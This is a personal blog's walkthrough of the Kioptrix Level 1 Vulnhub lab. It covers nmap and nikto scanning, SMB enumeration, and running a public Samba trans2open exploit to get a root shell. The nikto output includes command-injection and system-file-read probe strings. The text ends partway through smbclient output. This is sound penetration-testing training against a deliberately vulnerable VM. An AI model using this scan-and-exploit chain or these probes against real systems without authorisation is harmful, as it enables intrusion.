<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="No Description"><meta name="keywords" content=""><meta name="author" content="Gavin Cui"><meta name="copyright" content="Gavin Cui"><title>No Subtitle | Gavin's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gavin Cui</div><div class="author-info__description text-center">No Description</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">23</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">8</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gavin's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Gavin's Blog</div><div id="site-sub-title">No Subtitle</div><div id="site-social-icons"><a class="social-icon" href="https://github.com/Gavincrz" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-github-square fab"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/08/Kioptrix-Level-1-Walkthrough/">Kioptrix Level 1 Walkthrough</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-08</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WalkThrough/">WalkThrough</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Vulnhub/">Vulnhub</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Find-IP-Address-of-target-Box"><a href="#Find-IP-Address-of-target-Box" class="headerlink" title="Find IP Address of target Box"></a>Find IP Address of target Box</h1><h2 id="check-current-interface"><a href="#check-current-interface" class="headerlink" title="check current interface:"></a>check current interface:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">─# ifconfig                                                     </span><br><span class="line">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.119.130  netmask 255.255.255.0  broadcast 192.168.119.255</span><br><span class="line">        inet6 fe80::20c:29ff:fec4:f034  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:c4:f0:34  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 184146  bytes 51512617 (49.1 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 167933  bytes 11553532 (11.0 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>interface is <code>eth0</code></p>
<h2 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h2><p>Using ARP messages to discover hosts</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 </span><br></pre></td></tr></table></figure>
<p>-i device: your network device (interface)  </p>
<p><img src="/images/kioptrix1_netdiscover.png" alt="image" title="screenshot of netdiscover"></p>
<p>So the target IP address is <code>192.168.119.254</code></p>
<h1 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a>Port Scan</h1><h2 id="first-Scan"><a href="#first-Scan" class="headerlink" title="first Scan"></a>first Scan</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sS --stats-every 3m --max-scan-delay 20 --max-retries 1 --defeat-rst-ratelimit -p1-65535 -oN ~&#x2F;kiotrix1.txt 192.168.119.254</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--max-scan-delay to avoid following ICMP package get lost  </span><br><span class="line"></span><br><span class="line">      --defeat-rst-ratelimit</span><br><span class="line">           Many hosts have long used rate limiting to reduce the number of ICMP error messages (such as</span><br><span class="line">           port-unreachable errors) they send. Some systems now apply similar rate limits to the RST (reset)</span><br><span class="line">           packets they generate. This can slow Nmap down dramatically as it adjusts its timing to reflect those</span><br><span class="line">           rate limits. You can tell Nmap to ignore those rate limits (for port scans such as SYN scan which don&#39;t</span><br><span class="line">           treat non-responsive ports as open) by specifying --defeat-rst-ratelimit.</span><br><span class="line"></span><br><span class="line">           Using this option can reduce accuracy, as some ports will appear non-responsive because Nmap didn&#39;t</span><br><span class="line">           wait long enough for a rate-limited RST response. With a SYN scan, the non-response results in the port</span><br><span class="line">           being labeled filtered rather than the closed state we see when RST packets are received. This option</span><br><span class="line">           is useful when you only care about open ports, and distinguishing between closed and filtered ports</span><br><span class="line">           isn&#39;t worth the extra time.</span><br></pre></td></tr></table></figure>
<p>The port identifiers are unsigned 16-bit integers, meaning that the largest number you can put in there is 2^16-1 = 65535</p>
<p>Get error: <code>All 65535 scanned ports on 192.168.119.254 are filtered</code></p>
<h2 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h2><p>192.168.119.254 is not the IP address of Kioptrix box. I encounter a problem that Kioptrix can not be set use NAT or Host only mode. It will automatically switch to Bridged(Automatic) when launching. So weird. Link: <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/66538382/network-setting-automatically-switched-to-bridged-in-vmware-player">network setting automatically switched to Bridged in VMWare Player</a></p>
<p>I will stick with briged mode for now, it is not safe btw.</p>
<p>So the IP address of target Box is <code>192.168.0.22</code></p>
<h2 id="First-Scan-continue"><a href="#First-Scan-continue" class="headerlink" title="First Scan continue"></a>First Scan continue</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">map -sS -n -Pn -p- -T4 192.168.0.22 </span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22&#x2F;tcp   open  ssh</span><br><span class="line">80&#x2F;tcp   open  http</span><br><span class="line">111&#x2F;tcp  open  rpcbind</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn</span><br><span class="line">443&#x2F;tcp  open  https</span><br><span class="line">1024&#x2F;tcp open  kdm</span><br></pre></td></tr></table></figure>


<h2 id="Second-Scan"><a href="#Second-Scan" class="headerlink" title="Second Scan"></a>Second Scan</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -nvv -sSV -p 22,80,111,139,443,1024 --version-intensity 9 -A -oN 192.168.0.22</span><br></pre></td></tr></table></figure>
<p>-n/-R: Never do DNS resolution/Always resolve [default: sometimes]<br>–version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)<br>-sSV is a combine of sS and sV, sV service and version detection</p>
<h2 id="Some-Notes"><a href="#Some-Notes" class="headerlink" title="Some Notes"></a>Some Notes</h2><p>interesint 80, 443 for webserver, tcp 139 samba </p>
<p>SMB a communication protocal for providing shared access to files, printers, and serial ports between nodes on a network</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br></pre></td></tr></table></figure>

<h2 id="UDP-Scan"><a href="#UDP-Scan" class="headerlink" title="UDP Scan"></a>UDP Scan</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --top-ports 1000 -sU -Pn --stats-every 3m --max-retries 1 -T3 192.168.0.22</span><br></pre></td></tr></table></figure>

<h1 id="SSH-enumeration"><a href="#SSH-enumeration" class="headerlink" title="SSH enumeration"></a>SSH enumeration</h1><p>openssh version: <code>OpenSSH 2.9p2</code><br>Google it, find some CVE’s with Exec Code Overflow <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2002-0640/">CVE-2002-0640</a><br>need OS to <code>when OpenBSD is using PAM modules with interactive keyboard authentication (PAMAuthenticationViaKbdInt).</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit openssh</span><br></pre></td></tr></table></figure>

<p>Try directly connect to it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssh 192.168.0.22    </span><br><span class="line">Unable to negotiate with 192.168.0.22 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1</span><br><span class="line"></span><br><span class="line"># so use one of the exchange method and try again</span><br><span class="line">ssh -oKexAlgorithms&#x3D;+diffie-hellman-group1-sha1 192.168.0.22 </span><br><span class="line"></span><br><span class="line">Unable to negotiate with 192.168.0.22 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se</span><br><span class="line"></span><br><span class="line"># then add the cipher</span><br><span class="line">ssh -c aes128-cbc -oKexAlgorithms&#x3D;+diffie-hellman-group1-sha1 192.168.0.22 </span><br><span class="line">root@192.168.0.22&#39;s password: </span><br></pre></td></tr></table></figure>
<p>Last resort for passwork attack, easy be detected, if theres a log<br>Usually SSH is not your first thing to try</p>
<h2 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a>HTTP Enumeration</h2><p>port 80 and 443</p>
<ul>
<li>go to their web page through web broser</li>
<li>view the source code</li>
<li>check out https://</li>
</ul>
<h3 id="Directory-Scan"><a href="#Directory-Scan" class="headerlink" title="Directory Scan"></a>Directory Scan</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirbuster</span><br></pre></td></tr></table></figure>
<p>some wordlist stored in <code>/usr/share/wordlists/dirbuster</code><br>Also download some big wordlist, google <code>dirbuster wordlist</code><br>I actually not found through google, its in githubrepo <a target="_blank" rel="noopener" href="https://github.com/digination/dirbuster-ng">https://github.com/digination/dirbuster-ng</a></p>
<p>remove <code>manual</code> from the wordlist, there are many php manual page, waste of time, but let me try<br><img src="/images/kioptrix1_dirbuster.png" alt="image" title="screenshot of dirbuster"></p>
<p>nothing interesting</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h 192.168.0.22</span><br></pre></td></tr></table></figure>
<p>-h -host</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.0.22</span><br><span class="line">+ Target Hostname:    192.168.0.22</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2021-03-09 21:53:34 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;1.3.20 (Unix)  (Red-Hat&#x2F;Linux) mod_ssl&#x2F;2.8.4 OpenSSL&#x2F;0.9.6b</span><br><span class="line">+ Server may leak inodes via ETags, header found with file &#x2F;, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ OpenSSL&#x2F;0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.</span><br><span class="line">+ Apache&#x2F;1.3.20 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ mod_ssl&#x2F;2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</span><br><span class="line">+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE </span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ OSVDB-838: Apache&#x2F;1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</span><br><span class="line">+ OSVDB-4552: Apache&#x2F;1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</span><br><span class="line">+ OSVDB-2733: Apache&#x2F;1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.</span><br><span class="line">+ mod_ssl&#x2F;2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2002-0082, OSVDB-756.</span><br><span class="line">+ &#x2F;&#x2F;&#x2F;etc&#x2F;hosts: The server install allows reading of any system file by adding an extra &#39;&#x2F;&#39; to the URL.</span><br><span class="line">+ OSVDB-682: &#x2F;usage&#x2F;: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).</span><br><span class="line">+ OSVDB-3268: &#x2F;manual&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;manual&#x2F;: Web server manual found.</span><br><span class="line">+ OSVDB-3268: &#x2F;icons&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</span><br><span class="line">+ OSVDB-3092: &#x2F;test.php: This might be interesting...</span><br><span class="line">+ &#x2F;wp-content&#x2F;themes&#x2F;twentyeleven&#x2F;images&#x2F;headers&#x2F;server.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;wordpresswp-content&#x2F;themes&#x2F;twentyeleven&#x2F;images&#x2F;headers&#x2F;server.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;wp-includes&#x2F;Requests&#x2F;Utility&#x2F;content-post.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;wordpresswp-includes&#x2F;Requests&#x2F;Utility&#x2F;content-post.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;wp-includes&#x2F;js&#x2F;tinymce&#x2F;themes&#x2F;modern&#x2F;Meuhy.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;wordpresswp-includes&#x2F;js&#x2F;tinymce&#x2F;themes&#x2F;modern&#x2F;Meuhy.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;assets&#x2F;mobirise&#x2F;css&#x2F;meta.php?filesrc&#x3D;: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;login.cgi?cli&#x3D;aa%20aa%27cat%20&#x2F;etc&#x2F;hosts: Some D-Link router remote command execution.</span><br><span class="line">+ &#x2F;shell?cat+&#x2F;etc&#x2F;hosts: A backdoor was identified.</span><br><span class="line">+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host</span><br><span class="line">+ End Time:           2021-03-09 21:53:58 (GMT-5) (24 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>If there’s PUT or DELETE method, that would be interesting</p>
<p>scan for https: <code>nikto -h 192.168.0.22:443</code></p>
<h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>add some smb configuration <code>tc/samba/smb.conf </code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">client use spnego &#x3D; no</span><br><span class="line">client ntlmv2 auth &#x3D; no</span><br></pre></td></tr></table></figure>
<p>deprecated.. use the following</p>
<p>SPNEGO is used when a client application wants to authenticate to a remote server, but neither end is sure what authentication protocols the other supports.</p>
<p>not sure why I need those</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 192.168.0.22</span><br></pre></td></tr></table></figure>

<p>Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from <a target="_blank" rel="noopener" href="http://www.bindview.com/">www.bindview.com</a>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; </span><br><span class="line">|    Session Check on 192.168.0.22    |</span><br><span class="line"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; </span><br><span class="line">[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>resolve the issue by adding this to smb.conf:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client min protocol &#x3D; NT1</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; </span><br><span class="line">|    OS information on 192.168.0.22    |</span><br><span class="line"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; </span><br><span class="line">Use of uninitialized value $os_info in concatenation (.) or string at .&#x2F;enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info for 192.168.0.22 from smbclient: </span><br><span class="line">[+] Got OS info for 192.168.0.22 from srvinfo:</span><br><span class="line">        KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server</span><br><span class="line">        platform_id     :       500</span><br><span class="line">        os version      :       4.5</span><br><span class="line">        server type     :       0x9a03</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>use metasploit to detect smb version</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br><span class="line">set rhosts 192.168.0.22</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p>samba version is <code>Samba 2.2.1a</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">searchsploit samba 2.2</span><br><span class="line">----------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                     |  Path</span><br><span class="line">----------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Samba 2.0.x&#x2F;2.2 - Arbitrary File Creation                                          | unix&#x2F;remote&#x2F;20968.txt</span><br><span class="line">Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                       | osx&#x2F;remote&#x2F;9924.rb</span><br><span class="line">Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (1)                         | unix&#x2F;remote&#x2F;22468.c</span><br><span class="line">Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (2)                         | unix&#x2F;remote&#x2F;22469.c</span><br><span class="line">Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (3)                         | unix&#x2F;remote&#x2F;22470.c</span><br><span class="line">Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (4)                         | unix&#x2F;remote&#x2F;22471.txt</span><br><span class="line">Samba 2.2.x - &#39;nttrans&#39; Remote Overflow (Metasploit)                               | linux&#x2F;remote&#x2F;9936.rb</span><br><span class="line">Samba 2.2.x - CIFS&#x2F;9000 Server A.01.x Packet Assembling Buffer Overflow            | unix&#x2F;remote&#x2F;22356.c</span><br><span class="line">Samba 2.2.x - Remote Buffer Overflow                                               | linux&#x2F;remote&#x2F;7.pl</span><br><span class="line">---------------------------------------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>

<p>goto <a target="_blank" rel="noopener" href="https://www.exploit-db.com/search">https://www.exploit-db.com/search</a>, search for trans2open</p>
<p>Tried some exploits, <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/22469">https://www.exploit-db.com/exploits/22469</a> this one works and I successfully get the shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;22469 -t 192.168.0.22 </span><br></pre></td></tr></table></figure>

<p><img src="/images/kioptrix1_root.png" alt="image" title="screenshot of dirbuster"></p>
<h3 id="Nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nbtscan 192.168.0.22</span><br><span class="line">Doing NBT name scan for addresses from 192.168.0.22</span><br><span class="line"></span><br><span class="line">IP address       NetBIOS Name     Server    User             MAC address      </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">192.168.0.22     KIOPTRIX         &lt;server&gt;  KIOPTRIX         00:00:00:00:00:00</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Resolve the host name</p>
<p>NetBIOS over TCP/IP (NBT, or sometimes NetBT) is a networking protocol that allows legacy computer applications relying on the NetBIOS API to be used on modern TCP/IP networks. </p>
<p>On Windows, SMB can run directly over TCP/IP without the need for NetBIOS over TCP/IP. This will use, as you point out, port 445.</p>
<p>Generally speaking, on other systems, you’ll find services and applications using port 139. This, basically speaking, means that SMB is running with NetBIOS over TCP/IP, where, stack-wise, SMB is on top of NetBIOS if you are to imagine it with the OSI model.</p>
<p>SMB does rely on NetBIOS for communication with devices that do not support direct hosting of SMB over TCP/IP.</p>
<p>NetBIOS is completely independent from SMB. It is an API that SMB, and other technologies can use, so NetBIOS has no dependency to SMB. </p>
<p><a target="_blank" rel="noopener" href="https://superuser.com/questions/694469/difference-between-netbios-and-smb">https://superuser.com/questions/694469/difference-between-netbios-and-smb</a></p>
<h3 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 192.168.0.22</span><br><span class="line">Enter WORKGROUP\root&#39;s password: </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        IPC$            IPC       IPC Service (Samba Server)</span><br><span class="line">        ADMIN$          IPC       IPC Service (Samba Server)</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">Server does not support EXTENDED_SECURITY  but &#39;client use spnego &#x3D; yes&#39; and &#39;client ntlmv2 auth &#x3D; yes&#39; is set</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line">        KIOPTRIX             Samba Server</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        HIRON                INTEL_CE_LINUX</span><br><span class="line">        MYGROUP              